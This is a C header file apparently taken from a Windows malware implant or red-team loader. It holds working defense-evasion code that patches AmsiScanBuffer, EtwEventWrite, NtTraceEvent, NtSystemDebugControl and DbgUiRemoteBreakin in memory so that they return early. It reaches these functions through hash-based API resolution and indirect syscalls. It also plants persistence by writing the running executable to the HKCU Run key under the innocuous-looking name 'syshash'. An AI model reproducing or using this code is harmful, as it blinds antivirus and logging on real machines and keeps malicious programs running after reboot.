#ifndef PATCHES_H
#define PATCHES_H

#include <stdint.h>
#include <stdbool.h>
#include <windows.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "debug.c"
#include "obf.c"
#include "syscallresolve.c"
#include "syscall.c"
#include "hashes.h"


#define STATUS_SUCCESS 0x00000000
#define PAGE_EXECUTE_READWRITE 0x40


bool is_nt_status_success(uintptr_t status) {
    return status == STATUS_SUCCESS;
}


const char* format_nt_status(uintptr_t status) {
    static char buffer[32];
    snprintf(buffer, sizeof(buffer), "0x%08llX", status);
    return buffer;
}

bool patch_amsi(void) {
    debug_printfln("PATCHES", "Starting AMSI patch\n");
    

    uint32_t amsi_hash = get_hash("amsi.dll");
    uintptr_t amsi_base = get_module_base(amsi_hash);
    if (amsi_base == 0) {
        debug_printfln("PATCHES", "amsi.dll not found (not loaded)\n");
        return false;
    }
    debug_printfln("PATCHES", "Found amsi.dll at: 0x%p\n", (void*)amsi_base);


    uint32_t function_hash = get_hash("AmsiScanBuffer");
    uintptr_t proc_addr = get_function_address(amsi_base, function_hash);
    if (proc_addr == 0) {
        debug_printfln("PATCHES", "AmsiScanBuffer function not found\n");
        return false;
    }
    debug_printfln("PATCHES", "Found AmsiScanBuffer at: 0x%p\n", (void*)proc_addr);


    const uintptr_t current_process = (uintptr_t)-1;
    unsigned char patch[] = {0x31, 0xC0, 0xC3}; // xor eax, eax; ret
    uintptr_t patch_size = sizeof(patch);
    uintptr_t old_protect = 0;
    

    uint32_t nt_protect_hash = get_hash("NtProtectVirtualMemory");
    uint16_t nt_protect_num = get_syscall_number(nt_protect_hash);
    if (nt_protect_num == 0xFFFF) {
        debug_printfln("PATCHES", "Failed to resolve NtProtectVirtualMemory syscall\n");
        return false;
    }

    uintptr_t protect_args[] = {
        current_process,
        (uintptr_t)&proc_addr,
        (uintptr_t)&patch_size,
        PAGE_EXECUTE_READWRITE,
        (uintptr_t)&old_protect
    };
    uintptr_t status = indirect_syscall(nt_protect_num, protect_args, 5);
    if (!is_nt_status_success(status)) {
        debug_printfln("PATCHES", "NtProtectVirtualMemory (make RWX) returned: %s\n", format_nt_status(status));
        return false;
    }
    debug_printfln("PATCHES", "Changed memory protection to RWX\n");


    for (size_t i = 0; i < sizeof(patch); i++) {
        *((unsigned char*)(proc_addr + i)) = patch[i];
    }
    debug_printfln("PATCHES", "Applied patch bytes\n");


    uintptr_t restore_args[] = {
        current_process,
        (uintptr_t)&proc_addr,
        (uintptr_t)&patch_size,
        old_protect,
        (uintptr_t)&old_protect  // We discard the new "oldProtect" here
    };
    status = indirect_syscall(nt_protect_num, restore_args, 5);
    if (!is_nt_status_success(status)) {
        debug_printfln("PATCHES", "NtProtectVirtualMemory (restore) returned: %s\n", format_nt_status(status));
        return false;
    }
    debug_printfln("PATCHES", "Restored original memory protection\n");

    return true;
}

bool patch_etw(void) {
    debug_printfln("PATCHES", "Starting ETW patch\n");
    

    uint32_t ntdll_hash = get_hash("ntdll.dll");
    uintptr_t ntdll_base = get_module_base(ntdll_hash);
    if (ntdll_base == 0) {
        debug_printfln("PATCHES", "ntdll.dll not found\n");
        return false;
    }
    debug_printfln("PATCHES", "Found ntdll.dll at: 0x%p\n", (void*)ntdll_base);


    uint32_t function_hash = get_hash("EtwEventWrite");
    uintptr_t proc_addr = get_function_address(ntdll_base, function_hash);
    if (proc_addr == 0) {
        debug_printfln("PATCHES", "EtwEventWrite function not found\n");
        return false;
    }
    debug_printfln("PATCHES", "Found EtwEventWrite at: 0x%p\n", (void*)proc_addr);


    const uintptr_t current_process = (uintptr_t)-1;
    unsigned char patch[] = {0x31, 0xC0, 0xC3}; // xor eax, eax; ret
    uintptr_t patch_size = sizeof(patch);
    uintptr_t old_protect = 0;
    

    uint32_t nt_protect_hash = get_hash("NtProtectVirtualMemory");
    uint16_t nt_protect_num = get_syscall_number(nt_protect_hash);
    if (nt_protect_num == 0xFFFF) {
        debug_printfln("PATCHES", "Failed to resolve NtProtectVirtualMemory syscall\n");
        return false;
    }

    uintptr_t protect_args[] = {
        current_process,
        (uintptr_t)&proc_addr,
        (uintptr_t)&patch_size,
        PAGE_EXECUTE_READWRITE,
        (uintptr_t)&old_protect
    };
    uintptr_t status = indirect_syscall(nt_protect_num, protect_args, 5);
    if (!is_nt_status_success(status)) {
        debug_printfln("PATCHES", "NtProtectVirtualMemory (make RWX) returned: %s\n", format_nt_status(status));
        return false;
    }
    debug_printfln("PATCHES", "Changed memory protection to RWX\n");


    for (size_t i = 0; i < sizeof(patch); i++) {
        *((unsigned char*)(proc_addr + i)) = patch[i];
    }
    debug_printfln("PATCHES", "Applied patch bytes\n");


    uintptr_t restore_args[] = {
        current_process,
        (uintptr_t)&proc_addr,
        (uintptr_t)&patch_size,
        old_protect,
        (uintptr_t)&old_protect
    };
    status = indirect_syscall(nt_protect_num, restore_args, 5);
    if (!is_nt_status_success(status)) {
        debug_printfln("PATCHES", "NtProtectVirtualMemory (restore) returned: %s\n", format_nt_status(status));
        return false;
    }
    debug_printfln("PATCHES", "Restored original memory protection\n");

    return true;
}

bool patch_dbgui_remote_breakin(void) {
    debug_printfln("PATCHES", "Starting DbgUiRemoteBreakin patch\n");
    

    uint32_t ntdll_hash = get_hash("ntdll.dll");
    uintptr_t ntdll_base = get_module_base(ntdll_hash);
    if (ntdll_base == 0) {
        debug_printfln("PATCHES", "ntdll.dll not found\n");
        return false;
    }
    debug_printfln("PATCHES", "Found ntdll.dll at: 0x%p\n", (void*)ntdll_base);


    uint32_t function_hash = get_hash("DbgUiRemoteBreakin");
    uintptr_t proc_addr = get_function_address(ntdll_base, function_hash);
    if (proc_addr == 0) {
        debug_printfln("PATCHES", "DbgUiRemoteBreakin function not found\n");
        return false;
    }
    debug_printfln("PATCHES", "Found DbgUiRemoteBreakin at: 0x%p\n", (void*)proc_addr);


    const uintptr_t current_process = (uintptr_t)-1;
    unsigned char patch[] = {0xC3}; // ret
    uintptr_t patch_size = sizeof(patch);
    uintptr_t old_protect = 0;
    

    uint32_t nt_protect_hash = get_hash("NtProtectVirtualMemory");
    uint16_t nt_protect_num = get_syscall_number(nt_protect_hash);
    if (nt_protect_num == 0xFFFF) {
        debug_printfln("PATCHES", "Failed to resolve NtProtectVirtualMemory syscall\n");
        return false;
    }

    uintptr_t protect_args[] = {
        current_process,
        (uintptr_t)&proc_addr,
        (uintptr_t)&patch_size,
        PAGE_EXECUTE_READWRITE,
        (uintptr_t)&old_protect
    };
    uintptr_t status = indirect_syscall(nt_protect_num, protect_args, 5);
    if (!is_nt_status_success(status)) {
        debug_printfln("PATCHES", "NtProtectVirtualMemory (make RWX) returned: %s\n", format_nt_status(status));
        return false;
    }
    debug_printfln("PATCHES", "Changed memory protection to RWX\n");


    for (size_t i = 0; i < sizeof(patch); i++) {
        *((unsigned char*)(proc_addr + i)) = patch[i];
    }
    debug_printfln("PATCHES", "Applied patch bytes\n");


    uintptr_t restore_args[] = {
        current_process,
        (uintptr_t)&proc_addr,
        (uintptr_t)&patch_size,
        old_protect,
        (uintptr_t)&old_protect
    };
    status = indirect_syscall(nt_protect_num, restore_args, 5);
    if (!is_nt_status_success(status)) {
        debug_printfln("PATCHES", "NtProtectVirtualMemory (restore) returned: %s\n", format_nt_status(status));
        return false;
    }
    debug_printfln("PATCHES", "Restored original memory protection\n");

    return true;
}

bool patch_nt_trace_event(void) {
    debug_printfln("PATCHES", "Starting NtTraceEvent patch\n");
    

    uint32_t ntdll_hash = get_hash("ntdll.dll");
    uintptr_t ntdll_base = get_module_base(ntdll_hash);
    if (ntdll_base == 0) {
        debug_printfln("PATCHES", "ntdll.dll not found\n");
        return false;
    }
    debug_printfln("PATCHES", "Found ntdll.dll at: 0x%p\n", (void*)ntdll_base);


    uint32_t function_hash = get_hash("NtTraceEvent");
    uintptr_t proc_addr = get_function_address(ntdll_base, function_hash);
    if (proc_addr == 0) {
        debug_printfln("PATCHES", "NtTraceEvent function not found\n");
        return false;
    }
    debug_printfln("PATCHES", "Found NtTraceEvent at: 0x%p\n", (void*)proc_addr);


    const uintptr_t current_process = (uintptr_t)-1;
    unsigned char patch[] = {0x31, 0xC0, 0xC3}; // xor eax, eax; ret
    uintptr_t patch_size = sizeof(patch);
    uintptr_t old_protect = 0;
    

    uint32_t nt_protect_hash = get_hash("NtProtectVirtualMemory");
    uint16_t nt_protect_num = get_syscall_number(nt_protect_hash);
    if (nt_protect_num == 0xFFFF) {
        debug_printfln("PATCHES", "Failed to resolve NtProtectVirtualMemory syscall\n");
        return false;
    }

    uintptr_t protect_args[] = {
        current_process,
        (uintptr_t)&proc_addr,
        (uintptr_t)&patch_size,
        PAGE_EXECUTE_READWRITE,
        (uintptr_t)&old_protect
    };
    uintptr_t status = indirect_syscall(nt_protect_num, protect_args, 5);
    if (!is_nt_status_success(status)) {
        debug_printfln("PATCHES", "NtProtectVirtualMemory (make RWX) returned: %s\n", format_nt_status(status));
        return false;
    }
    debug_printfln("PATCHES", "Changed memory protection to RWX\n");


    for (size_t i = 0; i < sizeof(patch); i++) {
        *((unsigned char*)(proc_addr + i)) = patch[i];
    }
    debug_printfln("PATCHES", "Applied patch bytes\n");


    uintptr_t restore_args[] = {
        current_process,
        (uintptr_t)&proc_addr,
        (uintptr_t)&patch_size,
        old_protect,
        (uintptr_t)&old_protect
    };
    status = indirect_syscall(nt_protect_num, restore_args, 5);
    if (!is_nt_status_success(status)) {
        debug_printfln("PATCHES", "NtProtectVirtualMemory (restore) returned: %s\n", format_nt_status(status));
        return false;
    }
    debug_printfln("PATCHES", "Restored original memory protection\n");

    return true;
}

bool patch_nt_system_debug_control(void) {
    debug_printfln("PATCHES", "Starting NtSystemDebugControl patch\n");
    

    uint32_t ntdll_hash = get_hash("ntdll.dll");
    uintptr_t ntdll_base = get_module_base(ntdll_hash);
    if (ntdll_base == 0) {
        debug_printfln("PATCHES", "ntdll.dll not found\n");
        return false;
    }
    debug_printfln("PATCHES", "Found ntdll.dll at: 0x%p\n", (void*)ntdll_base);


    uint32_t function_hash = get_hash("NtSystemDebugControl");
    uintptr_t proc_addr = get_function_address(ntdll_base, function_hash);
    if (proc_addr == 0) {
        debug_printfln("PATCHES", "NtSystemDebugControl function not found\n");
        return false;
    }
    debug_printfln("PATCHES", "Found NtSystemDebugControl at: 0x%p\n", (void*)proc_addr);


    const uintptr_t current_process = (uintptr_t)-1;
    unsigned char patch[] = {0x31, 0xC0, 0xC3}; // xor eax, eax; ret
    uintptr_t patch_size = sizeof(patch);
    uintptr_t old_protect = 0;
    

    uint32_t nt_protect_hash = get_hash("NtProtectVirtualMemory");
    uint16_t nt_protect_num = get_syscall_number(nt_protect_hash);
    if (nt_protect_num == 0xFFFF) {
        debug_printfln("PATCHES", "Failed to resolve NtProtectVirtualMemory syscall\n");
        return false;
    }

    uintptr_t protect_args[] = {
        current_process,
        (uintptr_t)&proc_addr,
        (uintptr_t)&patch_size,
        PAGE_EXECUTE_READWRITE,
        (uintptr_t)&old_protect
    };
    uintptr_t status = indirect_syscall(nt_protect_num, protect_args, 5);
    if (!is_nt_status_success(status)) {
        debug_printfln("PATCHES", "NtProtectVirtualMemory (make RWX) returned: %s\n", format_nt_status(status));
        return false;
    }
    debug_printfln("PATCHES", "Changed memory protection to RWX\n");


    for (size_t i = 0; i < sizeof(patch); i++) {
        *((unsigned char*)(proc_addr + i)) = patch[i];
    }
    debug_printfln("PATCHES", "Applied patch bytes\n");


    uintptr_t restore_args[] = {
        current_process,
        (uintptr_t)&proc_addr,
        (uintptr_t)&patch_size,
        old_protect,
        (uintptr_t)&old_protect
    };
    status = indirect_syscall(nt_protect_num, restore_args, 5);
    if (!is_nt_status_success(status)) {
        debug_printfln("PATCHES", "NtProtectVirtualMemory (restore) returned: %s\n", format_nt_status(status));
        return false;
    }
    debug_printfln("PATCHES", "Restored original memory protection\n");

    return true;
}


typedef struct {
    char** successful;
    int successful_count;
    char** failed;
    char** failed_errors;
    int failed_count;
} patch_results_t;

void free_patch_results(patch_results_t* results) {
    if (results->successful) {
        for (int i = 0; i < results->successful_count; i++) {
            free(results->successful[i]);
        }
        free(results->successful);
    }
    if (results->failed) {
        for (int i = 0; i < results->failed_count; i++) {
            free(results->failed[i]);
        }
        free(results->failed);
    }
    if (results->failed_errors) {
        for (int i = 0; i < results->failed_count; i++) {
            free(results->failed_errors[i]);
        }
        free(results->failed_errors);
    }
}

patch_results_t apply_all_patches(void) {
    patch_results_t results = {0};
    

    results.successful = malloc(5 * sizeof(char*));
    results.failed = malloc(5 * sizeof(char*));
    results.failed_errors = malloc(5 * sizeof(char*));
    

    struct {
        const char* name;
        bool (*func)(void);
    } patches[] = {
        {"AMSI", patch_amsi},
        {"ETW", patch_etw},
        {"DbgUiRemoteBreakin", patch_dbgui_remote_breakin},
        {"NtTraceEvent", patch_nt_trace_event},
        {"NtSystemDebugControl", patch_nt_system_debug_control}
    };
    
    for (size_t i = 0; i < 5; i++) {
        if (patches[i].func()) {
            results.successful[results.successful_count] = malloc(strlen(patches[i].name) + 1);
            strcpy(results.successful[results.successful_count], patches[i].name);
            results.successful_count++;
            debug_printfln("PATCHES", "Successfully applied %s patch\n", patches[i].name);
        } else {
            results.failed[results.failed_count] = malloc(strlen(patches[i].name) + 1);
            strcpy(results.failed[results.failed_count], patches[i].name);
            results.failed_errors[results.failed_count] = malloc(32);
            strcpy(results.failed_errors[results.failed_count], "patch failed");
            results.failed_count++;
            debug_printfln("PATCHES", "Failed to apply %s patch\n", patches[i].name);
        }
    }
    
    return results;
}


patch_results_t apply_critical_patches(void) {
    patch_results_t results = {0};
    

    results.successful = malloc(2 * sizeof(char*));
    results.failed = malloc(2 * sizeof(char*));
    results.failed_errors = malloc(2 * sizeof(char*));
    

    struct {
        const char* name;
        bool (*func)(void);
    } patches[] = {
        {"AMSI", patch_amsi},
        {"ETW", patch_etw}
    };
    
    for (size_t i = 0; i < 2; i++) {
        if (patches[i].func()) {
            results.successful[results.successful_count] = malloc(strlen(patches[i].name) + 1);
            strcpy(results.successful[results.successful_count], patches[i].name);
            results.successful_count++;
            debug_printfln("PATCHES", "Successfully applied critical %s patch\n", patches[i].name);
        } else {
            results.failed[results.failed_count] = malloc(strlen(patches[i].name) + 1);
            strcpy(results.failed[results.failed_count], patches[i].name);
            results.failed_errors[results.failed_count] = malloc(32);
            strcpy(results.failed_errors[results.failed_count], "patch failed");
            results.failed_count++;
            debug_printfln("PATCHES", "Failed to apply critical %s patch\n", patches[i].name);
        }
    }
    
    return results;
}



PWSTR string_to_utf16(const char* str) {
    if (!str) return NULL;
    
    int len = strlen(str);
    PWSTR result = malloc((len + 1) * sizeof(WCHAR));
    if (!result) return NULL;
    
    for (int i = 0; i <= len; i++) {
        result[i] = (WCHAR)str[i];
    }
    
    return result;
}


UNICODE_STRING new_unicode_string(PWSTR buffer) {
    UNICODE_STRING us;
    if (buffer) {
        us.Length = (USHORT)(wcslen(buffer) * sizeof(WCHAR));
        us.MaximumLength = us.Length + sizeof(WCHAR);
        us.Buffer = buffer;
    } else {
        us.Length = 0;
        us.MaximumLength = 0;
        us.Buffer = NULL;
    }
    return us;
}


char* get_current_user_sid(void) {
    HANDLE token;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        return NULL;
    }
    
    DWORD token_info_length = 0;
    GetTokenInformation(token, TokenUser, NULL, 0, &token_info_length);
    
    if (token_info_length == 0) {
        CloseHandle(token);
        return NULL;
    }
    
    PTOKEN_USER token_user = malloc(token_info_length);
    if (!token_user) {
        CloseHandle(token);
        return NULL;
    }
    
    if (!GetTokenInformation(token, TokenUser, token_user, token_info_length, &token_info_length)) {
        free(token_user);
        CloseHandle(token);
        return NULL;
    }
    
    LPSTR sid_string;
    if (!ConvertSidToStringSidA(token_user->User.Sid, &sid_string)) {
        free(token_user);
        CloseHandle(token);
        return NULL;
    }
    
    char* result = malloc(strlen(sid_string) + 1);
    if (result) {
        strcpy(result, sid_string);
    }
    
    LocalFree(sid_string);
    free(token_user);
    CloseHandle(token);
    
    return result;
}

bool create_run_key(void) {
    debug_printfln("PATCHES", "Starting CreateRunKey() for registry persistence\n");
    

    char executable_path[MAX_PATH];
    DWORD path_length = GetModuleFileNameA(NULL, executable_path, MAX_PATH);
    if (path_length == 0) {
        debug_printfln("PATCHES", "Failed to get executable path\n");
        return false;
    }
    debug_printfln("PATCHES", "Current executable path: %s\n", executable_path);


    char* sid = get_current_user_sid();
    if (!sid) {
        debug_printfln("PATCHES", "Failed to get current user SID\n");
        return false;
    }
    debug_printfln("PATCHES", "Current user SID: %s\n", sid);


    char hkcu_path[512];
    snprintf(hkcu_path, sizeof(hkcu_path), "\\Registry\\User\\%s", sid);
    debug_printfln("PATCHES", "Opening HKCU registry path: %s\n", hkcu_path);
    
    PWSTR hkcu_path_utf16 = string_to_utf16(hkcu_path);
    if (!hkcu_path_utf16) {
        free(sid);
        return false;
    }
    
    UNICODE_STRING unicode_hkcu_path = new_unicode_string(hkcu_path_utf16);
    
    OBJECT_ATTRIBUTES object_attributes;
    object_attributes.Length = sizeof(object_attributes);
    object_attributes.RootDirectory = NULL;
    object_attributes.ObjectName = &unicode_hkcu_path;
    object_attributes.Attributes = OBJ_CASE_INSENSITIVE;
    object_attributes.SecurityDescriptor = NULL;
    object_attributes.SecurityQualityOfService = NULL;


    uint32_t nt_open_key_hash = get_hash("NtOpenKey");
    uint16_t nt_open_key_num = get_syscall_number(nt_open_key_hash);
    if (nt_open_key_num == 0xFFFF) {
        debug_printfln("PATCHES", "Failed to resolve NtOpenKey syscall\n");
        free(hkcu_path_utf16);
        free(sid);
        return false;
    }

    HANDLE hkcu_handle;
    uintptr_t open_args[] = {
        (uintptr_t)&hkcu_handle,
        KEY_ALL_ACCESS,
        (uintptr_t)&object_attributes
    };
    uintptr_t status = indirect_syscall(nt_open_key_num, open_args, 3);
    if (!is_nt_status_success(status)) {
        debug_printfln("PATCHES", "NtOpenKey for HKCU failed with status: 0x%lx\n", status);
        free(hkcu_path_utf16);
        free(sid);
        return false;
    }
    debug_printfln("PATCHES", "Successfully opened HKCU registry key\n");


    const char* run_key_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    debug_printfln("PATCHES", "Creating/opening Run registry subkey: %s\n", run_key_path);
    
    PWSTR run_key_path_utf16 = string_to_utf16(run_key_path);
    if (!run_key_path_utf16) {

        uint32_t nt_close_hash = get_hash("NtClose");
        uint16_t nt_close_num = get_syscall_number(nt_close_hash);
        if (nt_close_num != 0xFFFF) {
            uintptr_t close_args[] = { (uintptr_t)hkcu_handle };
            indirect_syscall(nt_close_num, close_args, 1);
        }
        free(hkcu_path_utf16);
        free(sid);
        return false;
    }
    
    UNICODE_STRING unicode_run_key_path = new_unicode_string(run_key_path_utf16);


    OBJECT_ATTRIBUTES subkey_object_attributes;
    subkey_object_attributes.Length = sizeof(subkey_object_attributes);
    subkey_object_attributes.RootDirectory = hkcu_handle;
    subkey_object_attributes.ObjectName = &unicode_run_key_path;
    subkey_object_attributes.Attributes = OBJ_CASE_INSENSITIVE;
    subkey_object_attributes.SecurityDescriptor = NULL;
    subkey_object_attributes.SecurityQualityOfService = NULL;


    uint32_t nt_create_key_hash = get_hash("NtCreateKey");
    uint16_t nt_create_key_num = get_syscall_number(nt_create_key_hash);
    if (nt_create_key_num == 0xFFFF) {
        debug_printfln("PATCHES", "Failed to resolve NtCreateKey syscall\n");
        free(run_key_path_utf16);
        free(hkcu_path_utf16);
        free(sid);
        return false;
    }

    HANDLE run_key_handle;
    uintptr_t disposition;
    uintptr_t create_args[] = {
        (uintptr_t)&run_key_handle,
        KEY_ALL_ACCESS,
        (uintptr_t)&subkey_object_attributes,
        0,
        0,
        REG_OPTION_NON_VOLATILE,
        (uintptr_t)&disposition
    };
    status = indirect_syscall(nt_create_key_num, create_args, 7);
    if (!is_nt_status_success(status)) {
        debug_printfln("PATCHES", "NtCreateKey for Run key failed with status: 0x%lx\n", status);

        uint32_t nt_close_hash = get_hash("NtClose");
        uint16_t nt_close_num = get_syscall_number(nt_close_hash);
        if (nt_close_num != 0xFFFF) {
            uintptr_t close_args[] = { (uintptr_t)hkcu_handle };
            indirect_syscall(nt_close_num, close_args, 1);
        }
        free(run_key_path_utf16);
        free(hkcu_path_utf16);
        free(sid);
        return false;
    }
    debug_printfln("PATCHES", "Successfully created/opened Run key\n");


    const char* value_name = "syshash";
    PWSTR value_name_utf16 = string_to_utf16(value_name);
    PWSTR value_data_utf16 = string_to_utf16(executable_path);
    
    if (!value_name_utf16 || !value_data_utf16) {

        if (value_name_utf16) free(value_name_utf16);
        if (value_data_utf16) free(value_data_utf16);
        uint32_t nt_close_hash = get_hash("NtClose");
        uint16_t nt_close_num = get_syscall_number(nt_close_hash);
        if (nt_close_num != 0xFFFF) {
            uintptr_t close_args[] = { (uintptr_t)run_key_handle };
            indirect_syscall(nt_close_num, close_args, 1);
            close_args[0] = (uintptr_t)hkcu_handle;
            indirect_syscall(nt_close_num, close_args, 1);
        }
        free(run_key_path_utf16);
        free(hkcu_path_utf16);
        free(sid);
        return false;
    }
    
    UNICODE_STRING unicode_value_name = new_unicode_string(value_name_utf16);
    uintptr_t value_data_size = (strlen(executable_path) + 1) * sizeof(WCHAR);


    uint32_t nt_set_value_hash = get_hash("NtSetValueKey");
    uint16_t nt_set_value_num = get_syscall_number(nt_set_value_hash);
    if (nt_set_value_num == 0xFFFF) {
        debug_printfln("PATCHES", "Failed to resolve NtSetValueKey syscall\n");
        free(value_name_utf16);
        free(value_data_utf16);
        free(run_key_path_utf16);
        free(hkcu_path_utf16);
        free(sid);
        return false;
    }

    uintptr_t set_value_args[] = {
        (uintptr_t)run_key_handle,
        (uintptr_t)&unicode_value_name,
        0,
        REG_SZ,
        (uintptr_t)value_data_utf16,
        value_data_size
    };
    status = indirect_syscall(nt_set_value_num, set_value_args, 6);
    if (!is_nt_status_success(status)) {
        debug_printfln("PATCHES", "NtSetValueKey failed with status: 0x%lx\n", status);
        free(value_name_utf16);
        free(value_data_utf16);
        free(run_key_path_utf16);
        free(hkcu_path_utf16);
        free(sid);
        return false;
    }
    
    debug_printfln("PATCHES", "Successfully created registry persistence entry\n");


    free(value_name_utf16);
    free(value_data_utf16);
    free(run_key_path_utf16);
    free(hkcu_path_utf16);
    free(sid);

    
    uint32_t nt_close_hash = get_hash("NtClose");
    uint16_t nt_close_num = get_syscall_number(nt_close_hash);
    if (nt_close_num != 0xFFFF) {
        uintptr_t close_args[] = { (uintptr_t)run_key_handle };
        indirect_syscall(nt_close_num, close_args, 1);
        close_args[0] = (uintptr_t)hkcu_handle;
        indirect_syscall(nt_close_num, close_args, 1);
    }

    return true;
}

#endif // PATCHES_H 